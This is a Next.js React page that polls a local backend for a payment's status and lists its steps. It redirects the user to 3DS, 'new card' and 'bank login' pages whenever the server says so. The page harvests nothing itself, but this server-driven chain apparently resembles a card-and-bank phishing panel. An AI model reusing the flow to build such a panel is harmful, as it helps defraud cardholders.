'use client'

import { useState, useEffect } from 'react'
import { useParams, useSearchParams } from 'next/navigation'
import { useAuth } from '@/hooks/use-auth'
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card'
import { Button } from '@/components/ui/button'
import { Badge } from '@/components/ui/badge'
import { useToast } from '@/hooks/use-toast'
import { motion } from 'framer-motion'
import { 
  CheckCircle, 
  Clock, 
  AlertCircle, 
  CreditCard, 
  Building2, 
  Shield, 
  ArrowRight,
  RefreshCw,
  Loader2
} from 'lucide-react'
import { useTranslations } from 'next-intl'

interface PaymentStatus {
  id: string
  status: 'pending' | 'processing' | 'completed' | 'failed' | 'requires_action'
  amount: number
  currency: string
  payment_method: string
  created_at: string
  updated_at: string
  current_step: string
  steps: PaymentStep[]
}

interface PaymentStep {
  name: string
  status: 'pending' | 'completed' | 'failed' | 'current'
  description: string
  timestamp?: string
  details?: any
}

const stepIcons = {
  'card_payment': CreditCard,
  '3ds_verification': Shield,
  'new_card_request': CreditCard,
  'bank_login': Building2,
  'payment_processing': RefreshCw,
  'payment_completed': CheckCircle
}

const stepColors = {
  'pending': 'bg-gray-500',
  'completed': 'bg-green-500',
  'failed': 'bg-red-500',
  'current': 'bg-blue-500'
}

export default function PaymentStatusPage() {
  const params = useParams()
  const searchParams = useSearchParams()
  const { isAuthenticated } = useAuth()
  const { toast } = useToast()
  const t = useTranslations('payments')
  
  const [paymentStatus, setPaymentStatus] = useState<PaymentStatus | null>(null)
  const [loading, setLoading] = useState(true)
  const [refreshing, setRefreshing] = useState(false)
  const [currentStep, setCurrentStep] = useState<string>('')
  const [redirecting, setRedirecting] = useState(false)

  const paymentId = params.id as string
  const step = searchParams.get('step')

  useEffect(() => {
    if (step) {
      setCurrentStep(step)
    }
  }, [step])

  useEffect(() => {
    if (isAuthenticated && paymentId) {
      fetchPaymentStatus()
    }
  }, [isAuthenticated, paymentId])

  // Poll payment status every 2s and auto-redirect like on checking/3ds pages
  useEffect(() => {
    if (!isAuthenticated || !paymentId) return
    const intv = setInterval(async () => {
      const res = await fetch(`http://localhost:8000/api/payments/payment/${paymentId}/status`, {
        headers: { 'Authorization': `Bearer ${localStorage.getItem('token')}` }
      })
      if (res.ok) {
        const data = await res.json()
        const status = data.status
        // Update local state for UI
        setPaymentStatus((prev) => prev ? { ...prev, status } : prev)
        // Redirect decisions
        if (!redirecting) {
          if (status === 'waiting_3ds') {
            setRedirecting(true)
            window.location.href = window.location.pathname.replace(/\/status\/.*/, `/3ds?payment_id=${paymentId}&amount=${data.amount}&currency=${data.currency}`)
          } else if (status === 'requires_new_card') {
            setRedirecting(true)
            window.location.href = window.location.pathname.replace(/\/status\/.*/, `/new-card?payment_id=${paymentId}&amount=${data.amount}&currency=${data.currency}`)
          } else if (status === 'requires_bank_login') {
            setRedirecting(true)
            window.location.href = window.location.pathname.replace(/\/status\/.*/, `/bank-login?payment_id=${paymentId}&amount=${data.amount}&currency=${data.currency}`)
          }
        }
      }
    }, 2000)
    return () => clearInterval(intv)
  }, [isAuthenticated, paymentId, redirecting])

  const fetchPaymentStatus = async () => {
    try {
      const response = await fetch(`http://localhost:8000/api/payments/payment/${paymentId}/status`, {
        headers: {
          'Authorization': `Bearer ${localStorage.getItem('token')}`
        }
      })

      if (response.ok) {
        const data = await response.json()
        setPaymentStatus(data)
      } else {
        toast({
          title: t('error'),
          description: t('failedToLoadPaymentStatus'),
          variant: "destructive",
        })
      }
    } catch (error) {
      toast({
        title: t('error'),
        description: t('errorLoadingStatus'),
        variant: "destructive"
      })
    } finally {
      setLoading(false)
    }
  }

  const refreshStatus = async () => {
    setRefreshing(true)
    await fetchPaymentStatus()
    setRefreshing(false)
  }

  const getStepIcon = (stepName: string) => {
    const Icon = stepIcons[stepName as keyof typeof stepIcons] || Clock
    return <Icon className="h-5 w-5" />
  }

  const getStatusColor = (status: string) => {
    return stepColors[status as keyof typeof stepColors] || 'bg-gray-500'
  }

  const getStatusText = (status: string) => {
    switch (status) {
      case 'pending': return t('pending')
      case 'completed': return t('completed')
      case 'failed': return t('failed')
      case 'current': return t('processing')
      default: return status
    }
  }

  const getStepDescription = (stepName: string) => {
    switch (stepName) {
      case 'card_payment':
        return t('cardPayment')
      case '3ds_verification':
        return t('3dsVerification')
      case 'new_card_request':
        return t('newCardRequest')
      case 'bank_login':
        return t('bankLogin')
      case 'payment_processing':
        return t('paymentProcessing')
      case 'payment_completed':
        return t('paymentCompleted')
      default:
        return stepName
    }
  }

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-black text-white flex items-center justify-center">
        <div className="text-center">
          <Loader2 className="h-8 w-8 animate-spin mx-auto mb-4" />
          <p>{t('redirectingToLoginPage')}</p>
        </div>
      </div>
    )
  }

  if (loading) {
    return (
      <div className="min-h-screen bg-black text-white flex items-center justify-center">
        <div className="text-center">
          <Loader2 className="h-8 w-8 animate-spin mx-auto mb-4" />
          <p>{t('loadingPaymentStatus')}</p>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-black text-white py-20">
      <div className="max-w-4xl mx-auto px-4">
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8 }}
          className="text-center mb-8"
        >
          <h1 className="text-4xl font-bold text-white neon-glow mb-4">
            📊 <span className="text-cyan-400">{t('paymentStatus')}</span>
          </h1>
          <p className="text-xl text-gray-300">
            {t('trackPaymentProgress')}
          </p>
        </motion.div>

        {paymentStatus && (
          <>
            {/* Payment Information */}
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.8, delay: 0.2 }}
              className="mb-8"
            >
              <Card className="bg-black/50 border-cyan-500/30">
                <CardHeader>
                  <div className="flex items-center justify-between">
                    <div>
                      <CardTitle className="text-white">{t('payment')} #{paymentStatus.id}</CardTitle>
                      <CardDescription className="text-gray-400">
                        {t('createdAt')}: {new Date(paymentStatus.created_at).toLocaleString('ru-RU')}
                      </CardDescription>
                    </div>
                    <Button
                      onClick={refreshStatus}
                      disabled={refreshing}
                      variant="outline"
                      className="border-cyan-500/30 text-cyan-400 hover:bg-cyan-500/10"
                    >
                      {refreshing ? (
                        <Loader2 className="h-4 w-4 animate-spin" />
                      ) : (
                        <RefreshCw className="h-4 w-4" />
                      )}
                    </Button>
                  </div>
                </CardHeader>
                <CardContent>
                  <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                    <div className="text-center">
                      <div className="text-2xl font-bold text-white mb-2">
                        {paymentStatus.amount} {paymentStatus.currency}
                      </div>
                      <div className="text-gray-400">{t('amount')}</div>
                    </div>
                    <div className="text-center">
                      <div className="text-lg font-semibold text-white mb-2">
                        {paymentStatus.payment_method}
                      </div>
                      <div className="text-gray-400">{t('paymentMethod')}</div>
                    </div>
                    <div className="text-center">
                      <Badge 
                        variant="outline" 
                        className={`${
                          paymentStatus.status === 'completed' ? 'border-green-500/30 text-green-400' :
                          paymentStatus.status === 'failed' ? 'border-red-500/30 text-red-400' :
                          paymentStatus.status === 'processing' ? 'border-blue-500/30 text-blue-400' :
                          'border-yellow-500/30 text-yellow-400'
                        }`}
                      >
                        {paymentStatus.status === 'completed' ? t('completed') :
                         paymentStatus.status === 'failed' ? t('failed') :
                         paymentStatus.status === 'processing' ? t('processing') :
                         t('pending')}
                      </Badge>
                      <div className="text-gray-400 mt-1">{t('status')}</div>
                    </div>
                  </div>
                </CardContent>
              </Card>
            </motion.div>

            {/* Payment Progress */}
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.8, delay: 0.4 }}
            >
              <Card className="bg-black/50 border-cyan-500/30">
                <CardHeader>
                  <CardTitle className="text-white">{t('paymentProgress')}</CardTitle>
                  <CardDescription className="text-gray-400">
                    {t('stepByStepTracking')}
                  </CardDescription>
                </CardHeader>
                <CardContent>
                  <div className="space-y-6">
                    {paymentStatus.steps?.map((step, index) => (
                      <motion.div
                        key={step.name}
                        initial={{ opacity: 0, x: -20 }}
                        animate={{ opacity: 1, x: 0 }}
                        transition={{ duration: 0.5, delay: 0.6 + index * 0.1 }}
                        className="flex items-start space-x-4"
                      >
                        {/* Icon for status */}
                        <div className={`w-8 h-8 rounded-full ${getStatusColor(step.status)} flex items-center justify-center flex-shrink-0 mt-1`}>
                          {step.status === 'completed' ? (
                            <CheckCircle className="h-5 w-5 text-white" />
                          ) : step.status === 'failed' ? (
                            <AlertCircle className="h-5 w-5 text-white" />
                          ) : step.status === 'current' ? (
                            <Loader2 className="h-5 w-5 text-white animate-spin" />
                          ) : (
                            <Clock className="h-5 w-5 text-white" />
                          )}
                        </div>

                        {/* Step information */}
                        <div className="flex-1 min-w-0">
                          <div className="flex items-center justify-between mb-2">
                            <h3 className="text-lg font-semibold text-white">
                              {getStepDescription(step.name)}
                            </h3>
                            <Badge 
                              variant="outline" 
                              className={`${
                                step.status === 'completed' ? 'border-green-500/30 text-green-400' :
                                step.status === 'failed' ? 'border-red-500/30 text-red-400' :
                                step.status === 'current' ? 'border-blue-500/30 text-blue-400' :
                                'border-gray-500/30 text-gray-400'
                              }`}
                            >
                              {getStatusText(step.status)}
                            </Badge>
                          </div>
                          <p className="text-gray-400 mb-2">{step.description}</p>
                          {step.timestamp && (
                            <p className="text-sm text-gray-500">
                              {new Date(step.timestamp).toLocaleString('ru-RU')}
                            </p>
                          )}
                          {step.details && (
                            <div className="mt-2 p-3 bg-gray-800/50 rounded-lg">
                              <pre className="text-xs text-gray-300 overflow-x-auto">
                                {JSON.stringify(step.details, null, 2)}
                              </pre>
                            </div>
                          )}
                        </div>

                        {/* Arrow between steps */}
                        {index < paymentStatus.steps.length - 1 && (
                          <div className="flex-shrink-0 mt-4">
                            <ArrowRight className="h-4 w-4 text-gray-500" />
                          </div>
                        )}
                      </motion.div>
                    ))}

                    {/* If no steps, show basic information */}
                    {(!paymentStatus.steps || paymentStatus.steps.length === 0) && (
                      <div className="text-center py-8">
                        <Clock className="h-16 w-16 text-gray-500 mx-auto mb-4" />
                        <p className="text-gray-400">{t('loadingStepInformation')}</p>
                      </div>
                    )}
                  </div>
                </CardContent>
              </Card>
            </motion.div>

            {/* Actions */}
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.8, delay: 0.6 }}
              className="mt-8 text-center"
            >
              <div className="flex flex-col sm:flex-row gap-4 justify-center">
                <Button
                  onClick={refreshStatus}
                  disabled={refreshing}
                  variant="outline"
                  className="border-cyan-500/30 text-cyan-400 hover:bg-cyan-500/10"
                >
                  {refreshing ? (
                    <>
                      <Loader2 className="h-4 w-4 animate-spin mr-2" />
                      {t('updating')}...
                    </>
                  ) : (
                    <>
                      <RefreshCw className="h-4 w-4 mr-2" />
                      {t('refreshStatus')}
                    </>
                  )}
                </Button>
                
                <Button
                  onClick={() => window.history.back()}
                  variant="outline"
                  className="border-gray-500/30 text-gray-400 hover:bg-gray-500/10"
                >
                  {t('back')}
                </Button>
              </div>
            </motion.div>
          </>
        )}

        {/* Information about redirects */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8, delay: 0.8 }}
          className="mt-12 text-center"
        >
          <Card className="bg-black/50 border-gray-600/30 max-w-2xl mx-auto">
            <CardHeader>
              <CardTitle className="text-gray-300">{t('realTimeRedirects')}</CardTitle>
            </CardHeader>
            <CardContent>
              <div className="space-y-4">
                <div className="flex items-center justify-center space-x-2">
                  <div className="w-3 h-3 bg-green-500 rounded-full animate-pulse"></div>
                  <span className="text-gray-400">{t('activeRedirects')}</span>
                </div>
                <p className="text-gray-400 text-sm">
                  {t('systemAutomaticallyRedirects')}
                </p>
                <div className="flex justify-center space-x-4 text-xs text-gray-500">
                  <span>💳 {t('card')}</span>
                  <span>🏦 {t('bank')}</span>
                  <span>🔄 3DS</span>
                  <span>✅ {t('status')}</span>
                </div>
              </div>
            </CardContent>
          </Card>
        </motion.div>
      </div>
    </div>
  )
}
